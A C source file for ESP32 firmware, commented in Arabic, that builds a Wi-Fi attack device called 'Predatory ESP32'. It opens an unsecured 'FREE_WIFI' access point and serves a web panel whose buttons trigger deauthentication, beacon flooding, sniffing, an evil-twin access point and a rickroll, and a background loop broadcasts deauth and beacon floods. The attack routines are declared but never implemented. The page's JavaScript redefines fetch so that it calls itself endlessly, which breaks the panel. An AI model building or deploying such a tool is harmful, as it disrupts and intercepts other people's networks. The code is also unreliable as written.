#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_http_server.h"

static const char *TAG = "MAIN";

// --- دوال الهجمات (سيتم استدعاؤها من الويب) ---
void deauth_attack(uint8_t *bssid);
void beacon_flood(char *ssid);
void start_sniffing(void);
void evil_twin_start(char *target_ssid);
void rickroll_start(void);

// --- متغيرات للتحكم بالهجمات ---
int attacks_running = 0;

void start_attacks(void) { attacks_running = 1; ESP_LOGI(TAG, "Attacks STARTED"); }
void stop_attacks(void)  { attacks_running = 0; ESP_LOGI(TAG, "Attacks STOPPED"); }

// --- حلقة الهجمات التي تعمل في الخلفية ---
void attack_loop(void *pv) {
    while(1) {
        if (attacks_running) {
            uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            deauth_attack(bssid);
            beacon_flood("FREE_WIFI");
        }
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
}

// --- معالج صفحة الويب الرئيسية ---
static esp_err_t index_handler(httpd_req_t *req) {
    const char *html =
        "<!DOCTYPE html>"
        "<html><head><title>Predatory ESP32</title>"
        "<style>"
        "body{background:#0a0a0a;color:#00ff41;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}"
        ".container{text-align:center;border:2px solid #00ff41;padding:40px;border-radius:12px;background:#111;}"
        "h1{font-size:2.5em;margin-bottom:30px;text-shadow:0 0 20px #00ff41;}"
        ".grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;}"
        "button{background:transparent;border:2px solid #00ff41;color:#00ff41;padding:15px 25px;font-size:1.2em;cursor:pointer;border-radius:8px;}"
        "button:hover{background:#00ff41;color:#0a0a0a;box-shadow:0 0 30px #00ff41;}"
        ".start-btn{border-color:#00ff41;color:#00ff41;}.stop-btn{border-color:#ff0041;color:#ff0041;}"
        "#status{margin-top:25px;font-size:1.2em;padding:10px;border:1px solid #00ff41;border-radius:6px;}"
        "</style>"
        "</head><body>"
        "<div class='container'>"
        "<h1>⚡ Predatory ESP32</h1>"
        "<div class='grid'>"
        "<button class='start-btn' onclick=\"fetch('/start')\">▶ START ATTACKS</button>"
        "<button class='stop-btn' onclick=\"fetch('/stop')\">⏹ STOP ATTACKS</button>"
        "<button onclick=\"fetch('/deauth')\">⚡ Deauth</button>"
        "<button onclick=\"fetch('/beacon')\">📡 Beacon</button>"
        "<button onclick=\"fetch('/sniff')\">👁 Sniff</button>"
        "<button onclick=\"fetch('/evil_twin')\">🎭 Evil Twin</button>"
        "<button onclick=\"fetch('/rickroll')\">🎵 Rickroll</button>"
        "</div>"
        "<div id='status'>✅ System Ready. Attacks are STOPPED.</div>"
        "</div>"
        "<script>"
        "function fetch(url){ fetch(url).then(() => { document.getElementById('status').textContent = 'Command sent: ' + url; }); }"
        "</script>"
        "</body></html>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, html, strlen(html));
    return ESP_OK;
}

// --- معالج أوامر الهجمات (API) ---
static esp_err_t attack_api_handler(httpd_req_t *req) {
    const char *uri = req->uri;
    ESP_LOGI(TAG, "API Request: %s", uri);
    if (strstr(uri, "/start")) start_attacks();
    else if (strstr(uri, "/stop")) stop_attacks();
    else if (strstr(uri, "/deauth")) { uint8_t bssid[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}; deauth_attack(bssid); }
    else if (strstr(uri, "/beacon")) beacon_flood("FREE_WIFI");
    else if (strstr(uri, "/sniff")) start_sniffing();
    else if (strstr(uri, "/evil_twin")) evil_twin_start("FREE_WIFI");
    else if (strstr(uri, "/rickroll")) rickroll_start();
    httpd_resp_send(req, "OK", 2);
    return ESP_OK;
}

// --- تشغيل خادم الويب ---
void start_web_server(void) {
    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 10;
    config.lru_purge_enable = true;

    ESP_LOGI(TAG, "Starting web server...");
    if (httpd_start(&server, &config) == ESP_OK) {
        httpd_uri_t index_uri = { .uri = "/", .method = HTTP_GET, .handler = index_handler };
        httpd_register_uri_handler(server, &index_uri);
        httpd_uri_t api_uri = { .uri = "/*", .method = HTTP_GET, .handler = attack_api_handler };
        httpd_register_uri_handler(server, &api_uri);
        ESP_LOGI(TAG, "✅ Web server started successfully!");
    } else {
        ESP_LOGE(TAG, "❌ Failed to start web server!");
    }
}

// --- تشغيل نقطة الوصول (AP) ---
void start_ap(void) {
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREE_WIFI",
            .ssid_len = 9,
            .password = "",
            .channel = 1,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .beacon_interval = 100,
        },
    };
    ESP_LOGI(TAG, "Starting AP: FREE_WIFI");
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "✅ AP started successfully!");
}

// --- الدالة الرئيسية ---
void app_main(void) {
    ESP_LOGI(TAG, "=== SYSTEM BOOTING ===");

    // 1. تهيئة NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // 2. تهيئة الشبكة
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    // 3. تهيئة الـ WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    // 4. تشغيل نقطة الوصول (AP)
    start_ap();

    // 5. تشغيل خادم الويب (المشكلة الأساسية كانت هنا)
    start_web_server();

    // 6. بدء مهمة الهجمات في الخلفية (موقفة افتراضياً)
    xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "=== 🟢 SYSTEM READY ===");
    ESP_LOGI(TAG, "📶 Connect to 'FREE_WIFI' and open http://192.168.4.1");
}
